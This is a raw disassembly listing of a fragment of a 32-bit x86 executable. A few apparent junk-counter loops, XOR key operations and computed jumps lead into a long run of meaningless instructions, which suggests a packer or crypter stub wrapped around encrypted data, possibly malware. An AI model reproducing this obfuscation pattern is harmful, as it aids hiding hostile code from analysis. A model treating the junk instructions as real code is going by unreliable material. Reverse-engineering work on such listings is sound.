  402924:	mov    dh,BYTE PTR [esi+0x77ec5d82]
  40292a:	lods   eax,DWORD PTR ds:[esi]
  40292b:	or     DWORD PTR [ebp-0x7ee2f028],esp
  402931:	out    0x3a,eax
  402933:	add    edi,edx
  402935:	xor    al,0x16
  402937:	or     edi,ebx
  402939:	pop    es
  40293a:	dec    edi
  40293b:	cmp    DWORD PTR [ebx],esi
  40293d:	cld    
  40293e:	pop    ebp
  40293f:	mov    cl,0x97
  402941:	adc    al,0x74
  402943:	out    0xa7,eax
  402945:	xor    DWORD PTR [esi-0x3fb8c8cc],eax
  40294b:	jl     0x4029c0
  40294d:	clc    
  40294e:	cmp    esp,DWORD PTR ds:0x439095d9
  402954:	fucomip st,st(0)
  402956:	js     0x4028e7
  402958:	sub    BYTE PTR [ecx],bl
  40295a:	sub    al,0xee
  40295c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40295d:	call   0x964a:0x9a835dc2
  402964:	jle    0x40290d
  402966:	adc    BYTE PTR [esi-0x37],bl
  402969:	ret    0x4
  40296c:	push   ebp
  40296d:	mov    ebp,esp
  40296f:	sub    esp,0x28
  402972:	leave  
  402973:	ret    0x10
  402976:	push   ebp
  402977:	mov    ebp,esp
  402979:	push   ecx
  40297a:	or     eax,DWORD PTR ds:0x42fcdd
  402980:	push   ecx
  402981:	movzx  edx,WORD PTR ds:0x42e6ef
  402988:	sbb    DWORD PTR ds:0x42e713,edx
  40298e:	mov    eax,0xf89c8531
  402993:	mov    DWORD PTR ds:0x42fce9,0x1a
  40299d:	cmp    DWORD PTR ds:0x42fce9,0x0
  4029a4:	je     0x402a39
  4029aa:	cmp    DWORD PTR ds:0x42fce9,0x24
  4029b1:	jne    0x4029cc
  4029b7:	push   0x42e12c
  4029bc:	push   0x42e703
  4029c1:	push   0x59d6
  4029c6:	call   DWORD PTR ds:0x42e44f
  4029cc:	mov    edx,DWORD PTR ds:0x42fce9
  4029d2:	dec    edx
  4029d3:	mov    DWORD PTR ds:0x42fce9,edx
  4029d9:	jmp    0x40299d
  4029de:	mov    DWORD PTR ds:0x42e6ff,0x19
  4029e8:	cmp    DWORD PTR ds:0x42e6ff,0x0
  4029ef:	je     0x402a39
  4029f5:	cmp    DWORD PTR ds:0x42e6ff,0x4
  4029fc:	jne    0x402a0d
  402a02:	push   0x5bc5
  402a07:	call   DWORD PTR ds:0x42e2d3
  402a0d:	cmp    DWORD PTR ds:0x42e6ff,0x5
  402a14:	jne    0x402a27
  402a1a:	mov    edx,DWORD PTR ds:0x42e6ff
  402a20:	dec    edx
  402a21:	mov    DWORD PTR ds:0x42e6ff,edx
  402a27:	mov    edx,DWORD PTR ds:0x42e6ff
  402a2d:	dec    edx
  402a2e:	mov    DWORD PTR ds:0x42e6ff,edx
  402a34:	jmp    0x4029e8
  402a39:	mov    DWORD PTR [ebp-0x8],eax
  402a3c:	mov    DWORD PTR [ebp-0x4],0xf89c8530
  402a43:	mov    edx,DWORD PTR [ebp-0x8]
  402a46:	mov    ecx,DWORD PTR ds:0x42fdae
  402a4c:	mov    ecx,DWORD PTR [ecx]
  402a4e:	xor    DWORD PTR ds:0x42fcd5,ecx
  402a54:	push   esi
  402a55:	mov    ecx,0x7510855
  402a5a:	or     DWORD PTR ds:0x42fd0d,ebx
  402a60:	xor    edx,ecx
  402a62:	sbb    esi,0x5361
  402a68:	mov    esi,0x32729c
  402a6d:	sbb    DWORD PTR ds:0x42e128,0x657d
  402a77:	push   edi
  402a78:	and    DWORD PTR ds:0x42e128,0x0
  402a82:	jmp    0x402a94
  402a87:	mov    edi,DWORD PTR ds:0x42e128
  402a8d:	inc    edi
  402a8e:	mov    DWORD PTR ds:0x42e128,edi
  402a94:	cmp    DWORD PTR ds:0x42e128,0x10
  402a9b:	jae    0x402abe
  402aa1:	cmp    DWORD PTR ds:0x42e128,0x11
  402aa8:	jne    0x402ab9
  402aae:	push   0x42e141
  402ab3:	call   DWORD PTR ds:0x42e453
  402ab9:	jmp    0x402a87
  402abe:	mov    edi,DWORD PTR [ebp+0x10]
  402ac1:	add    edx,esi
  402ac3:	cmp    edi,edx
  402ac5:	je     0x4036ba
  402acb:	mov    edx,DWORD PTR [ebp-0x8]
  402ace:	mov    eax,DWORD PTR [ebp-0x4]
  402ad1:	xor    eax,ecx
  402ad3:	mov    edi,0xffcd8d64
  402ad8:	sub    edi,eax
  402ada:	add    edi,DWORD PTR [ebp+0x10]
  402add:	xor    edx,ecx
  402adf:	jmp    0x402dbe
  402ae4:	imul   ebx,DWORD PTR [edx],0xffffff8f
  402ae7:	cmp    BYTE PTR [ebp+0x71],cl
  402aea:	jae    0x402a9d
  402aec:	jl     0x402b40
  402aee:	dec    esi
  402aef:	mov    esp,0xc35abe33
  402af4:	jo     0x402b02
  402af6:	jo     0x402b68
  402af8:	mov    esi,0x6870707e
  402afd:	cmp    al,0xbc
  402aff:	push   0xffffff9b
  402b01:	push   ss
  402b02:	pop    ecx
  402b03:	bound  edi,QWORD PTR [ebx+0x6d]
  402b06:	sub    eax,0x68ab3a41
  402b0b:	in     eax,dx
  402b0c:	mov    esi,0x862ea447
  402b11:	arpl   bx,sp
  402b13:	shl    DWORD PTR [esi-0x7d],1
  402b16:	push   0xffffff9e
  402b18:	add    dh,dh
  402b1a:	dec    edx
  402b1b:	cmp    bh,al
  402b1d:	xor    BYTE PTR [ebx+0x45],dh
  402b20:	loopne 0x402b34
  402b22:	mov    ecx,0x77679226
  402b27:	retf   0x8b20
  402b2a:	xchg   edx,eax
  402b2b:	jnp    0x402abd
  402b2d:	mov    edi,0x408ca4aa
  402b32:	xchg   ebx,eax
  402b33:	xchg   esp,eax
  402b34:	xor    DWORD PTR [edi+0x43],0xd2a4d498
  402b3b:	pop    ebx
  402b3c:	aam    0x2
  402b3e:	retf   0x7a08
  402b41:	xchg   esi,ebx
  402b43:	jbe    0x402b4e
  402b45:	sbb    ebx,ebx
  402b47:	ins    DWORD PTR es:[edi],dx
  402b48:	out    0x4a,al
  402b4a:	xor    eax,0x20c36e15
  402b4f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402b50:	adc    DWORD PTR [ebx],eax
  402b52:	pop    esi
  402b53:	mov    ebx,0xb963701f
  402b58:	fiadd  DWORD PTR [esi+ebx*8]
  402b5b:	adc    ebx,DWORD PTR [eax]
  402b5d:	dec    edi
  402b5e:	gs es jb 0x402b60
  402b62:	not    DWORD PTR [ebx-0x46]
  402b65:	add    bh,BYTE PTR [esi]
  402b67:	cmc    
  402b68:	cdq    
  402b69:	ins    BYTE PTR es:[edi],dx
  402b6a:	push   ds
  402b6b:	mov    esi,0xf8215ab8
  402b70:	dec    eax
  402b71:	cld    
  402b72:	add    al,ch
  402b74:	inc    ebx
  402b75:	das    
  402b76:	aas    
  402b77:	outs   dx,BYTE PTR ds:[esi]
  402b78:	cmp    eax,edi
  402b7a:	and    DWORD PTR [edx-0x5c39eb23],ecx
  402b80:	pop    edi
  402b81:	fdivp  st(6),st
  402b83:	test   al,0x46
  402b85:	in     eax,0x39
  402b87:	mov    ebx,0x19164108
  402b8c:	lock sti 
  402b8e:	sub    DWORD PTR [edx+0x22f78090],edi
  402b94:	mov    esi,ecx
  402b96:	repz ss std 
  402b99:	push   0x3b58181a
  402b9e:	push   esp
  402b9f:	cmp    al,0x23
  402ba1:	out    0x92,al
  402ba3:	inc    esp
  402ba4:	int3   
  402ba5:	sub    eax,0x2e4f6582
  402baa:	nop
  402bab:	xor    BYTE PTR [ecx-0x727de00c],0x98
  402bb2:	in     eax,dx
  402bb3:	xor    cl,BYTE PTR [edx]
  402bb5:	push   0x8f1bfc3
  402bba:	popf   
  402bbb:	fs push ds
  402bbd:	or     bl,bl
  402bbf:	std    
  402bc0:	push   ecx
  402bc1:	fcom   QWORD PTR [edx]
  402bc3:	je     0x402b6e
  402bc5:	(bad)
  402bc9:	loope  0x402b72
  402bcb:	(bad)
  402bce:	mov    dh,0x1a
  402bd0:	pushf  
  402bd1:	icebp  
  402bd2:	js     0x402c38
  402bd4:	repz out dx,eax
  402bd6:	ret    
  402bd7:	das    
  402bd8:	call   0xff16119
  402bdd:	add    eax,0xb11b4b4c
  402be2:	xor    eax,DWORD PTR [ebp+esi*2+0x53]
  402be6:	push   edx
  402be7:	push   eax
  402be8:	pusha  
  402be9:	mov    dh,al
  402beb:	pop    ss
  402bec:	(bad)  
  402bed:	xchg   edi,eax
  402bee:	(bad)  
  402bef:	mov    BYTE PTR [edx+ebx*1],dh
  402bf2:	inc    edi
  402bf3:	aaa    
  402bf4:	fmul   QWORD PTR [ebx]
  402bf6:	lods   eax,DWORD PTR ds:[esi]
  402bf7:	leave  
  402bf8:	xchg   BYTE PTR [eax-0x53],bl
  402bfb:	adc    esp,DWORD PTR ss:[esp+esi*1]
  402bff:	icebp  
  402c00:	xor    BYTE PTR [esi-0x23],ah
  402c03:	iret   
  402c04:	jle    0x402c03
  402c06:	pushf  
  402c07:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402c08:	cld    
  402c09:	pop    eax
  402c0a:	mov    cs,WORD PTR [ebx]
  402c0c:	ja     0x402ba5
  402c0e:	sbb    dl,bl
  402c10:	mov    esi,ebp
  402c12:	inc    DWORD PTR [edx+0x79ac2488]
  402c18:	sub    edx,DWORD PTR [ebp-0xf7c93e1]
  402c1e:	shl    BYTE PTR [edx],0xed
  402c21:	popa   
  402c22:	adc    ah,ch
  402c24:	test   eax,0xf0b247d
  402c29:	bound  ecx,QWORD PTR [esi-0x7d]
  402c2c:	xor    ah,ch
  402c2e:	xor    bl,BYTE PTR [esi+ecx*2]
  402c31:	sbb    al,0x9b
  402c33:	xor    eax,DWORD PTR [edx+0xb]
  402c36:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402c37:	popa   
  402c38:	xchg   ebp,eax
  402c39:	fidivr WORD PTR [esi-0x44bcf645]
  402c3f:	repz inc ebp
  402c41:	aad    0xa6
  402c43:	std    
  402c44:	fistp  QWORD PTR [ecx]
  402c46:	mov    eax,0x32caee5d
  402c4b:	into   
  402c4c:	xchg   edx,eax
  402c4d:	test   al,0xfe
  402c4f:	(bad)
  402c52:	test   DWORD PTR [esi],ecx
  402c54:	jmp    0x402be2
  402c56:	sub    edx,ebp
  402c58:	xor    DWORD PTR [ebx-0x65],esi
  402c5b:	mov    WORD PTR [esi],ds
  402c5d:	loope  0x402cdc
  402c5f:	jb     0x402c35
  402c61:	and    DWORD PTR ds:0x8f36f06,edi
  402c67:	fcomp  QWORD PTR [ecx-0x15]
  402c6a:	and    DWORD PTR [edi+0x6caf1856],esp
  402c70:	mov    dl,0x46
  402c72:	mov    bh,0x3f
  402c74:	outs   dx,DWORD PTR ds:[esi]
  402c75:	ds xchg edi,eax
  402c77:	pcmpgtd mm7,QWORD PTR [eax-0x4ad1f855]
  402c7e:	popa   
  402c7f:	pop    esi
  402c80:	leave  
  402c81:	mov    ah,0x60
  402c83:	imul   ebx,ebx,0x91361247
  402c89:	out    dx,al
  402c8a:	loopne 0x402ca0
  402c8c:	push   0xffffff96
  402c8e:	mov    fs,ebx
  402c90:	je     0x402cf4
  402c92:	mov    cs,edx
  402c94:	mov    esp,0x1b899b89
  402c99:	inc    eax
  402c9a:	mov    bl,BYTE PTR [ecx-0x64]
  402c9d:	mov    cl,0x4c
  402c9f:	rcr    BYTE PTR [ebx+0x5a],0xe6
  402ca3:	(bad)  
  402ca4:	and    dl,bh
  402ca6:	dec    esi
  402ca7:	out    dx,eax
  402ca8:	data16 and bh,BYTE PTR [edx+0x47bf5204]
  402caf:	std    
  402cb0:	pop    es
  402cb1:	bound  ebx,QWORD PTR [ebp-0x64]
  402cb4:	sti    
  402cb5:	cmovo  edi,eax
  402cb8:	or     DWORD PTR [ecx-0x19],edi
  402cbb:	ror    BYTE PTR [ecx-0x61c9bc89],0x4e
  402cc2:	(bad)  
  402cc3:	cmp    cl,bh
  402cc5:	repnz aam 0x2d
  402cc8:	mov    ds:0x5f6c8c69,al
  402ccd:	les    ecx,FWORD PTR [esi+0x565dfff0]
  402cd3:	push   cs
  402cd4:	clc    
  402cd5:	dec    ecx
  402cd6:	and    eax,0x7396186d
  402cdb:	pop    ebp
  402cdc:	cmp    dl,BYTE PTR [eax-0x1b44f45b]
  402ce2:	ins    BYTE PTR es:[edi],dx
  402ce3:	ret    0x39ed
  402ce6:	xchg   BYTE PTR [ebx-0x1e],cl
  402ce9:	jl     0x402d30
  402ceb:	outs   dx,BYTE PTR ds:[esi]
  402cec:	xor    cl,0xce
  402cef:	dec    ecx
  402cf0:	loopne 0x402cee
  402cf2:	push   es
  402cf3:	jmp    0xfac6:0x225830aa
  402cfa:	mov    ah,0x8
  402cfc:	push   esi
  402cfd:	push   eax
  402cfe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402cff:	pop    ss
  402d00:	int3   
  402d01:	push   ebx
  402d02:	aaa    
  402d03:	out    0xf7,eax
  402d05:	mov    bh,0x44
  402d07:	xchg   ebp,eax
  402d08:	and    edi,esp
  402d0a:	fistp  WORD PTR [edi]
  402d0c:	xchg   BYTE PTR [ebx+0x2f],ch
  402d0f:	xchg   ebp,eax
  402d10:	inc    ebx
  402d11:	call   0xe0ca61ff
  402d16:	push   esp
  402d17:	pushf  
  402d18:	aad    0x4e
  402d1a:	je     0x402d4f
  402d1c:	jns    0x402d5c
  402d1e:	mov    eax,ds:0xcf554a1
  402d23:	or     BYTE PTR ss:[eax-0x69],ch
  402d27:	push   edx
  402d28:	add    eax,0x8904801
  402d2d:	call   0x3a5015ca
  402d32:	imul   ecx,DWORD PTR [ebp+0x6b],0x371c167c
  402d39:	popa   
  402d3a:	mov    DWORD PTR [esi],esp
  402d3c:	ret    0xe228
  402d3f:	or     ebx,eax
  402d41:	and    eax,0x55dd9985
  402d46:	mov    ecx,0x68860cd9
  402d4b:	mov    ebx,0xfebd2215
  402d50:	mov    ah,0xe0
  402d52:	adc    al,0x60
  402d54:	and    DWORD PTR [ecx+0xd40d2e4],edi
  402d5a:	ret    
  402d5b:	test   al,0xf0
  402d5d:	or     esp,ecx
  402d5f:	jmp    0xfb26:0xaca615a5
  402d66:	ret    
  402d67:	pop    es
  402d68:	mov    esi,0x90ae5893
  402d6d:	mov    ebx,DWORD PTR [eax-0x47]
  402d70:	dec    esi
  402d71:	cmp    ebp,DWORD PTR [ebx-0x3dd81a68]
  402d77:	mov    ss,WORD PTR ds:0x3be1bf14
  402d7d:	bound  esi,QWORD PTR ds:0xaf962cd7
  402d83:	outs   dx,BYTE PTR ds:[esi]
  402d84:	sahf   
  402d85:	xor    dh,cl
  402d87:	cmp    ebp,esp
  402d89:	outs   dx,BYTE PTR ds:[esi]
  402d8a:	inc    esi
  402d8b:	loope  0x402d3e
  402d8d:	mov    eax,0x9d1b8d2a
  402d92:	xor    al,BYTE PTR [ebx-0x1c555bf8]
  402d98:	dec    ecx
  402d99:	xor    DWORD PTR [edx-0x3c],0x5189c120
  402da0:	fs std 
  402da2:	add    eax,0xffffff84
  402da5:	mov    WORD PTR [edi-0x24fe61e4],gs
  402dab:	mov    ds:0x213f033a,eax
  402db0:	sbb    eax,0x84ec754
  402db5:	push   edi
  402db6:	push   es
  402db7:	dec    ecx
  402db8:	jle    0x402dce
  402dba:	add    BYTE PTR [esi+0x2e],0xc7
  402dbe:	add    edx,esi
  402dc0:	cmp    edx,edi
  402dc2:	ja     0x4036b5
  402dc8:	push   ebx
  402dc9:	jmp    0x4030b2
  402dce:	jmp    0x4030ad
  402dd3:	mov    ecx,0xe1afe4fc
  402dd8:	ja     0x402e2b
  402dda:	push   0xffffffa6
  402ddc:	aas    
  402ddd:	xchg   ebp,eax
  402dde:	out    dx,eax
  402ddf:	aaa    
  402de0:	lahf   
  402de1:	loop   0x402e61
  402de3:	mov    esi,0xbe70700a
  402de8:	jle    0x402e5a
  402dea:	jo     0x402e40
  402dec:	mov    al,ds:0x534c238c
  402df1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402df2:	lea    eax,[ecx+ecx*2+0x21e27bac]
  402df9:	lea    ecx,[ebp-0x50fd8eb9]
  402dff:	push   ss
  402e00:	js     0x402e35
  402e02:	pusha  
  402e03:	ror    cl,0x34
  402e06:	sub    eax,0x699ff178
  402e0b:	repnz adc al,0xc1
  402e0e:	mov    esp,ds
  402e10:	mov    ch,0x92
  402e12:	jmp    0x6f37428c
  402e17:	(bad)  
  402e18:	push   eax
  402e19:	jecxz  0x402dcb
  402e1b:	out    dx,eax
  402e1c:	push   0x1621f79a
  402e21:	ins    BYTE PTR es:[edi],dx
  402e22:	fld    QWORD PTR [ecx]
  402e24:	push   0x117b766c
  402e29:	mov    ch,0xb3
  402e2b:	jne    0x402e82
  402e2d:	mov    WORD PTR [esi+edi*2-0x1958f8a8],cs
  402e34:	fcomip st,st(2)
  402e36:	popf   
  402e37:	mov    esp,0x7b7271a0
  402e3c:	dec    edi
  402e3d:	adc    dh,dl
  402e3f:	mov    edi,?
  402e41:	mov    al,ds:0x7cb1b99b
  402e46:	ds jmp 0x402e67
  402e49:	mov    ds:0x594f09b,al
  402e4e:	adc    DWORD PTR [ebx],eax
  402e50:	std    
  402e51:	fst    st(4)
  402e53:	or     al,0xe8
  402e55:	mov    edx,0xe9b6d9d8
  402e5a:	cmp    edx,DWORD PTR [edx+edx*1]
  402e5d:	push   ebp
  402e5e:	or     al,0xc7
  402e60:	push   ebp
  402e61:	dec    edi
  402e62:	repnz ins DWORD PTR es:[edi],dx
  402e64:	test   eax,ebp
  402e66:	fist   DWORD PTR gs:[esi+0x2a5e776]
  402e6d:	mov    ecx,cs
  402e6f:	fidiv  WORD PTR [ebp+0x75200e3e]
  402e75:	nop
  402e76:	push   ecx
  402e77:	out    dx,eax
  402e78:	push   ebx
  402e79:	ret    0xdea9
  402e7c:	inc    edi
  402e7d:	lea    ebp,es:[esi+0x3b]
  402e81:	cmp    BYTE PTR [ebp+edi*1-0x7636d5f8],bh
  402e88:	pop    esi
  402e89:	inc    ebp
  402e8a:	xchg   esp,eax
  402e8b:	dec    edi
  402e8c:	int3   
  402e8d:	mov    bh,0x39
  402e8f:	repnz push ss
  402e91:	call   0x4fadd7d4
  402e96:	pop    ds
  402e97:	xlat   BYTE PTR ds:[ebx]
  402e98:	loope  0x402ef9
  402e9a:	or     al,0xba
  402e9c:	xchg   esi,eax
  402e9d:	fidivr WORD PTR ds:0x477e299c
  402ea3:	jno    0x402e80
  402ea5:	stos   BYTE PTR es:[edi],al
  402ea6:	aaa    
  402ea7:	shl    bl,0x38
  402eaa:	adc    ebx,ecx
  402eac:	dec    ebx
  402ead:	dec    edi
  402eae:	jp     0x402f1a
  402eb0:	add    BYTE PTR [edi+0x1808c419],cl
  402eb6:	mov    ebx,0x3f8c7534
  402ebb:	mov    ebp,0xfee163d1
  402ec0:	mov    cl,BYTE PTR [ecx+0x58]
  402ec3:	out    0x4e,al
  402ec5:	sbb    eax,edx
  402ec7:	(bad)  
  402ec8:	dec    ebp
  402ec9:	mov    ds:0xbfbe1ae4,al
  402ece:	(bad)  
  402ed0:	in     al,0xa1
  402ed2:	pop    ds
  402ed3:	pop    ss
  402ed4:	test   al,0x13
  402ed6:	adc    dh,BYTE PTR [edi]
  402ed8:	enter  0x3e2b,0x7
  402edc:	call   0x6f17:0xeb56a46f
  402ee3:	xor    edx,DWORD PTR [ebx-0x1034ceb8]
  402ee9:	push   0xed10b228
  402eee:	es test eax,0x1fbdba8f
  402ef4:	test   eax,0x7eadbca2
  402ef9:	sbb    eax,0x47a0aee4
  402efe:	ins    DWORD PTR es:[edi],dx
  402eff:	push   0x49e25d86
  402f04:	nop
  402f05:	push   ss
  402f06:	fisttp QWORD PTR [eax]
  402f08:	ret    0xbad8
  402f0b:	hlt    
  402f0c:	clc    
  402f0d:	xor    edx,edx
  402f0f:	das    
  402f10:	shl    DWORD PTR [ebx-0x3cfde948],cl
  402f16:	add    al,al
  402f18:	mov    eax,ds:0xfcad31f8
  402f1d:	loopne 0x402ec9
  402f1f:	icebp  
  402f20:	(bad)  
  402f21:	sti    
  402f22:	pusha  
  402f23:	psllq  mm0,QWORD PTR [esi+0xe]
  402f27:	pop    esp
  402f28:	ins    BYTE PTR es:[edi],dx
  402f29:	enter  0x8b61,0x5f
  402f2d:	in     eax,0x70
  402f2f:	jle    0x402f85
  402f31:	(bad)  
  402f32:	dec    edi
  402f33:	jp     0x402f29
  402f35:	add    DWORD PTR [ecx+ecx*1],esp
  402f38:	xchg   BYTE PTR [ecx],bl
  402f3a:	mov    DWORD PTR [edi],esp
  402f3c:	popa   
  402f3d:	in     al,dx
  402f3e:	lahf   
  402f3f:	test   BYTE PTR [edi+0x16],ah
  402f42:	jp     0x402f04
  402f44:	popf   
  402f45:	adc    al,0x26
  402f47:	mov    bh,0x8b
  402f49:	retf   
  402f4a:	in     eax,dx
  402f4b:	ss inc edi
  402f4d:	stc    
  402f4e:	iret   
  402f4f:	cmp    al,0xd3
  402f51:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402f53:	neg    DWORD PTR [edi]
  402f55:	sbb    DWORD PTR [ecx+0x3a905c1a],ebp
  402f5b:	mov    eax,es
  402f5d:	stc    
  402f5e:	(bad)
  402f62:	es push ds
  402f64:	mov    al,0x9
  402f66:	sub    ecx,eax
  402f68:	out    0x6b,al
  402f6a:	and    BYTE PTR [esi+ebp*4],ah
  402f6d:	push   ebx
  402f6e:	dec    eax
  402f6f:	mov    fs,WORD PTR [ecx]
  402f71:	cmc    
  402f72:	adc    ch,BYTE PTR [ecx+0xe]
  402f75:	retf   0x27df
  402f78:	pop    edi
  402f79:	test   al,0xb7
  402f7b:	pop    esi
  402f7c:	adc    esi,DWORD PTR fs:[edi-0x78]
  402f80:	xor    ecx,DWORD PTR [bx+0x14]
  402f84:	nop
  402f85:	jecxz  0x402f78
  402f87:	cmp    al,0x98
  402f89:	xchg   ecx,eax
  402f8a:	jb     0x402f40
  402f8c:	rol    ecx,1
  402f8e:	cmp    BYTE PTR [ecx+ebx*1],cl
  402f91:	adc    eax,0x1c4075bb
  402f96:	mov    dl,0x34
  402f98:	mov    eax,ds:0x8f6fd65a
  402f9d:	mov    al,0x59
  402f9f:	mov    al,ds:0x8d206c54
  402fa4:	mul    BYTE PTR [eax]
  402fa6:	push   eax
  402fa7:	bnd lock jb 0x402fe3
  402fab:	inc    edx
  402fac:	rol    BYTE PTR [ecx-0x8],cl
  402faf:	sub    al,0x7b
  402fb1:	ret    
  402fb2:	pop    ebx
  402fb3:	jns    0x402f87
  402fb5:	lock or DWORD PTR [eax+ecx*4-0x1a684f40],esp
  402fbd:	add    ah,BYTE PTR [edx+0x4100995c]
  402fc3:	adc    DWORD PTR [ebx-0x6eb484a],0xac374b11
  402fcd:	and    DWORD PTR [edi-0x65],edx
  402fd0:	stos   DWORD PTR es:[edi],eax
  402fd1:	cmp    BYTE PTR [esi],0x18
  402fd4:	fs dec ecx
  402fd6:	adc    edx,DWORD PTR [edi-0x482bb9ff]
  402fdc:	(bad)  
  402fdd:	jmp    0x4bf6:0x54f62b60
  402fe4:	das    
  402fe5:	push   edx
  402fe6:	pop    edx
  402fe7:	xor    ecx,DWORD PTR [ecx]
  402fe9:	or     bh,ch
  402feb:	std    
  402fec:	mov    edx,0x590a4dbf
  402ff1:	loopne 0x402f89
  402ff3:	xlat   BYTE PTR ds:[ebx]
  402ff4:	jmp    0x76fc993e
  402ff9:	int3   
  402ffa:	sbb    DWORD PTR [ebx-0x432f37b5],edi
  403000:	adc    al,0x76
  403002:	inc    ah
  403004:	jb     0x402ffa
  403006:	xchg   DWORD PTR [ecx],edi
  403008:	pop    ecx
  403009:	adc    BYTE PTR [esi+ebp*4],ch
  40300c:	sub    DWORD PTR [ebx+eiz*8+0x54],ebx
  403010:	sub    DWORD PTR [ecx+0x280a04ab],eax
  403016:	out    dx,eax
  403017:	xchg   DWORD PTR [ebp-0x1b779322],esi
  40301d:	fdivp  st(7),st
  40301f:	pusha  
  403020:	(bad)  
  403021:	mov    esp,0xd5d439f9
  403026:	out    dx,eax
  403027:	inc    esp
  403028:	xor    edx,ebx
  40302a:	add    eax,0x3049ce28
  40302f:	ret    0xdb9f
  403032:	jl     0x40301a
  403034:	push   0x891adb16
  403039:	les    ecx,FWORD PTR [esi]
  40303b:	scas   eax,DWORD PTR es:[edi]
  40303c:	ja     0x402fbe
  40303e:	mov    bl,0xc1
  403040:	inc    ecx
  403041:	adc    esi,DWORD PTR [esi-0x6c]
  403044:	dec    ecx
  403045:	xor    ebp,DWORD PTR [ebp-0x29]
  403048:	aas    
  403049:	mov    ss,WORD PTR [ebp+ecx*8+0x5b]
  40304d:	or     dl,BYTE PTR [ebp-0x4d]
  403050:	hlt    
  403051:	and    eax,0x9368511e
  403056:	call   0xfaca:0x7afc0848
  40305d:	fsub   DWORD PTR [ebx+0xc068c06]
  403063:	out    0x1e,al
  403065:	or     al,0x94
  403067:	repnz pop esp
  403069:	fwait
  40306a:	jnp    0x40307a
  40306c:	shr    ch,1
  40306e:	adc    BYTE PTR [ebx+0x27cb1ee6],dl
  403074:	pop    es
  403075:	(bad)  
  403076:	clc    
  403077:	data16 (bad) 
  403079:	nop
  40307a:	fwait
  40307b:	outs   dx,BYTE PTR ds:[esi]
  40307c:	inc    eax
  40307d:	or     eax,ebx
  40307f:	sbb    dl,BYTE PTR [ebx+0x7af2e396]
  403085:	push   eax
  403086:	push   esp
  403087:	popa   
  403088:	xchg   esp,eax
  403089:	xchg   BYTE PTR [ebx+0x6],dh
  40308c:	inc    eax
  40308d:	sub    al,0x6f
  40308f:	mov    cl,dl
  403091:	jnp    0x4030aa
  403093:	inc    eax
  403094:	lahf   
  403095:	fst    QWORD PTR [edx+0x1d]
  403098:	xor    ch,BYTE PTR [eax]
  40309a:	xchg   edi,eax
  40309b:	cmp    DWORD PTR [ebp+0x3d],0x54
  40309f:	mov    ds:0x91f18d47,al
  4030a4:	in     eax,0xe
  4030a6:	cwde   
  4030a7:	ins    DWORD PTR es:[edi],dx
  4030a8:	mov    BYTE PTR [esi+0x20],al
  4030ab:	inc    edx
  4030ac:	mov    esi,0x32729cbe
  4030b1:	add    BYTE PTR [ebx+0x7d8bf845],cl
  4030b7:	cld    
  4030b8:	xor    edi,ecx
  4030ba:	add    edi,esi
  4030bc:	jmp    0x40339b
  4030c1:	fist   DWORD PTR [ecx+0x4b76cc16]
  4030c7:	loope  0x40307a
  4030c9:	lds    edx,FWORD PTR [esi-0x42]
  4030cc:	add    al,0x2c
  4030ce:	mov    ebx,0x17fcf12b
  4030d3:	jo     0x403145
  4030d5:	mov    esi,0xe870707e
  4030da:	cwde   
  4030db:	xchg   eax,esp
  4030dd:	push   ecx
  4030de:	jecxz  0x4030e6
  4030e0:	push   edi
  4030e1:	mov    db1,edi
  4030e4:	pop    ebx
  4030e5:	(bad)  
  4030e6:	(bad)  
  4030e7:	(bad)  
  4030e8:	cmp    esi,DWORD PTR [ebx]
  4030ea:	mov    gs,WORD PTR ds:0x41a9dd2b
  4030f0:	adc    ebx,DWORD PTR [ecx-0x1ef25d11]
  4030f6:	sub    ebp,0x1f6d6215
  4030fc:	(bad)  
  4030fd:	in     al,dx
  4030fe:	icebp  
  4030ff:	fadd   QWORD PTR [ecx]
  403101:	cmp    BYTE PTR [eax],cl
  403103:	jns    0x403135
  403105:	das    
  403106:	sbb    DWORD PTR [eax],edi
  403108:	lods   al,BYTE PTR ds:[esi]
  403109:	out    0x3c,eax
  40310b:	add    al,0xe3
  40310d:	push   edi
  40310e:	pop    edx
  40310f:	cwde   
  403110:	into   
  403111:	mov    esp,0x6d366179
  403116:	iret   
  403117:	adc    dl,dh
  403119:	jne    0x40310f
  40311b:	jae    0x40319b
  40311d:	cld    
  40311e:	sbb    edi,ecx
  403120:	mov    dh,0x16
  403122:	inc    esi
  403123:	push   esp
  403124:	mov    al,ds:0xb617404c
  403129:	or     BYTE PTR ss:[ebx-0x53],dh
  40312d:	sub    BYTE PTR [esi],bl
  40312f:	iret   
  403130:	ss or  al,0x76
  403133:	enter  0x1e76,0xf
  403137:	jne    0x4030bb
  403139:	xlat   BYTE PTR ds:[ebx]
  40313a:	lds    esp,FWORD PTR [eax+eiz*4+0x380f0876]
  403141:	jmp    0x25deffd5
  403146:	or     dh,BYTE PTR [ecx]
  403148:	iret   
  403149:	pop    esi
  40314a:	rcr    DWORD PTR [ecx],1
  40314c:	xor    BYTE PTR [esi-0x6],ah
  40314f:	gs inc esi
  403151:	imul   ebp,esp,0xffffffcf
  403154:	inc    ecx
  403155:	jmp    0xf963852a
  40315a:	xor    al,0x47
  40315c:	sub    edi,0xebed27cf
  403162:	xor    ecx,DWORD PTR es:[ebx+0x1f50b0e8]
  403169:	jmp    0x68b7:0xe68aa453
  403170:	leave  
  403171:	lock add al,0xf1
  403174:	mov    ds:0x1a1b1cf4,eax
  403179:	mov    al,al
  40317b:	jmp    0x265a9634
  403180:	and    ebp,ebx
  403182:	push   esp
  403183:	xor    BYTE PTR [edi+eax*8-0x6ca0174a],bl
  40318a:	es es and eax,0xc87709a0
  403191:	jno    0x403133
  403193:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403194:	push   esi
  403195:	jmp    0x403125
  403197:	sub    al,0x52
  403199:	fidiv  DWORD PTR ds:0x6bfbfd61
  40319f:	mov    edi,0xcc0472cd
  4031a4:	and    al,0xd8
  4031a6:	xchg   edx,eax
  4031a7:	mov    ebp,0x8984e0b
  4031ac:	mov    BYTE PTR gs:[ebx+edi*2-0x1ecb0f92],al
  4031b4:	xchg   esp,eax
  4031b5:	jns    0x403152
  4031b7:	cmp    al,0x64
